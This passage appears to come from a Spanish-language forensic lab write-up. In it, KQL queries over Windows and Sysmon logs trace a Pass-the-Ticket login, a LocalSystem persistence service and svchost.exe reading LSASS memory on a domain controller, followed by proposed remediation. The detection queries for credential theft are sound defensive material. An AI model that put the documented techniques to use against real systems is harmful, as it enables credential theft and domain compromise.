
Consulta KQL

```kql
event.code: "4768" and winlog.computer_name: "DC01.corp.local" and winlog.event_data.TargetUserName: *John.Snow*
```

Los 19 resultados muestran solicitudes de TGT. La solicitud más reciente corresponde a `10.100.0.24` a las `03:09:36`, sin observarse solicitudes posteriores desde `10.100.0.220` en los resultados consultados.

### Análisis técnico · Paso 18

|Evento|Hora (25/08/2023)|IP de origen|Cuenta|
|---|---|---|---|
|4768 — Solicitud de TGT|`03:09:36`|`10.100.0.24`|`John.Snow`|
|4769 — Solicitud de TGS|`04:09–04:10`|`10.100.0.220`|`John.Snow`|
|4624 — Inicio de sesión Kerberos|`04:09–04:10`|`10.100.0.220`|`John.Snow`|

La cuenta `John.Snow` presenta actividad Kerberos desde dos hosts distintos. Inicialmente se observan solicitudes TGT desde `10.100.0.24` y, aproximadamente una hora después, solicitudes TGS e inicios de sesión de red desde `10.100.0.220` (`PURPLE`). La ausencia de solicitudes TGT desde `PURPLE` durante el intervalo investigado, junto con el uso posterior de tickets Kerberos, constituye un indicador compatible con reutilización de tickets de autenticación

### Conclusión · Paso 18

Se identificó actividad compatible con Pass-the-Ticket (MITRE ATT&CK T1550.003) utilizando la cuenta `John.Snow` para acceder a `DC01.corp.local` desde el host comprometido `PURPLE`. La correlación de eventos 4768, 4769 y 4624 respalda la hipótesis de reutilización de tickets Kerberos,
## Paso 19 — Mecanismo de persistencia en DC01

### Consulta KQL de Kibana · Paso 19

Investigamos posibles mecanismos de persistencia en `DC01.corp.local` mediante eventos de instalación de servicios (**Event ID 7045**) y modificaciones de tareas programadas (**Event ID 4698, 106 y 140**), con el objetivo de identificar el ejecutable configurado para mantener acceso al controlador de dominio.

```kql
winlog.computer_name: "DC01.corp.local" and event.code: ("7045" or "4698" or "106" or "140")
```

### Evidencia · Paso 19

- [ ] 19.1 — Identificación de servicios y tareas

La consulta devolvió 153 eventos. Entre los resultados, identificamos dos instalaciones de servicios mediante el Event ID 7045.

|Hora (25/08/2023)|Evento|Servicio|
|---|---|---|
|04:10:24|7045|`6470517`|
|04:11:23|7045|`ServicesUpdater`|

El servicio `6470517` se instaló ocho milisegundos después del inicio de sesión de `John.Snow` identificado en el paso 18. No se investigó su función.

- [ ] 19.2 — Análisis del servicio ServicesUpdater

Filtramos los eventos **7045 (Service Installed)** para recuperar la configuración del servicio `ServicesUpdater`, incluyendo su ejecutable, tipo de inicio y cuenta de ejecución.

Consulta KQL

```kql
winlog.computer_name: "DC01.corp.local" and event.code: "7045" and message: *ServicesUpdater*
```

### Análisis técnico · Paso 19

|Campo|Resultado|
|---|---|
|Fecha y hora|`2023-08-25 04:11:23.428`|
|Host|`DC01.corp.local`|
|Evento|Windows Event ID 7045|
|Servicio|`ServicesUpdater`|
|Ejecutable|`C:\ProgramData\Services.exe`|
|Tipo|Servicio en modo usuario|
|Inicio|`Auto Start`|
|Cuenta|`LocalSystem`|

Se identificó la instalación de `ServicesUpdater`, configurado para ejecutar `C:\ProgramData\Services.exe` automáticamente bajo la cuenta `LocalSystem`. La ubicación del ejecutable en `ProgramData`, junto con el inicio automático y los privilegios de `LocalSystem`, constituye un indicador sospechoso de persistencia en el controlador de dominio.

### Conclusión · Paso 19

Se confirma la configuración de persistencia mediante un servicio de Windows (MITRE ATT&CK T1543.003) en `DC01.corp.local`. El servicio `ServicesUpdater` está configurado para iniciar automáticamente `C:\ProgramData\Services.exe` con privilegios de `LocalSystem`. La instalación y configuración están confirmadas.
## Paso 20 — Extracción de credenciales de LSASS en DC01

### Consulta KQL de Kibana · Paso 20

Investigamos los accesos a la memoria de `lsass.exe` en `DC01.corp.local` mediante Sysmon Event ID 10 (ProcessAccess), con el objetivo de identificar procesos que obtuvieron permisos de lectura sobre LSASS, comportamiento compatible con técnicas de extracción de credenciales (MITRE ATT&CK T1003.001).

```kql
event.code: "10" and winlog.computer_name: "DC01.corp.local" and winlog.event_data.TargetImage: *lsass.exe
```

### Evidencia · Paso 20

- [ ] 20.1 — Identificación de acceso a LSASS

La consulta devolvió un evento a las `04:11:53.845`, donde `svchost.exe` accedió a `lsass.exe` con permisos `0x1010`, que incluyen `PROCESS_VM_READ`. La traza de llamadas contiene un frame `UNKNOWN(...)`, compatible con código ejecutándose desde una región de memoria no asociada a un módulo identificado.

- [ ] 20.2 — Identificación del proceso de origen

Filtramos los eventos Sysmon ID 10 para aislar el acceso realizado desde `svchost.exe` hacia `lsass.exe` y recuperar el PID responsable.

**Consulta KQL**

```kql
event.code: "10" and winlog.computer_name: "DC01.corp.local" and winlog.event_data.SourceImage: *svchost.exe and winlog.event_data.TargetImage: *lsass.exe
```

### Análisis técnico · Paso 20

|Campo|Resultado|
|---|---|
|Fecha y hora|`2023-08-25 04:11:53.845`|
|Host|`DC01.corp.local`|
|Evento|Sysmon ID 10 (ProcessAccess)|
|Proceso origen|`C:\Windows\system32\svchost.exe`|
|PID origen|`4412`|
|SourceProcessGUID|`{5BB70711-8C79-64E8-BE02-000000008202}`|
|Proceso destino|`lsass.exe`|
|GrantedAccess|`0x1010`|
|Permiso relevante|`PROCESS_VM_READ`|
|CallTrace|Contiene un frame `UNKNOWN(...)`|

Se identificó que `svchost.exe` (PID `4412`) obtuvo acceso a `lsass.exe` con permisos de lectura de memoria, aproximadamente 30 segundos después de la instalación del servicio `ServicesUpdater` documentado en el paso 19. La presencia de un frame `UNKNOWN(...)` en la traza de llamadas constituye un indicador adicional de actividad sospechosa.

### Conclusión · Paso 20

Se confirma que `svchost.exe*` (PID  `4412`) obtuvo acceso a LSASS con permisos compatibles con extracción de credenciales, comportamiento asociado a MITRE ATT&CK T1003.001 (LSASS Memory). La correlación temporal con la instalación del servicio de persistencia refuerza la sospecha de actividad maliciosa.

## Respuesta y remediación propuestas

Estas acciones son recomendaciones derivadas del análisis; no se presentan como ejecutadas en el laboratorio.

- Aislar los hosts afectados y preservar registros de Sysmon, PowerShell y seguridad antes de limpiar artefactos.
- Revisar y retirar tareas, servicios y otros mecanismos de persistencia identificados; validar sus comandos y cuentas.
- Rotar las credenciales expuestas y revisar el alcance de las cuentas de servicio y los accesos al DC.
- Correlacionar host, ProcessGuid, tiempo y logon para evitar confundir PIDs reutilizados con una misma ejecución.
- Validar la contención con búsquedas posteriores de los mismos procesos, artefactos y conexiones.

## Lecturas relacionadas

- [Kerberoasting: contexto de la técnica](/active-directory/kerberoasting)
- [Active Directory Attack Paths: recorrido ofensivo de laboratorio](/labs/gcb-lab)
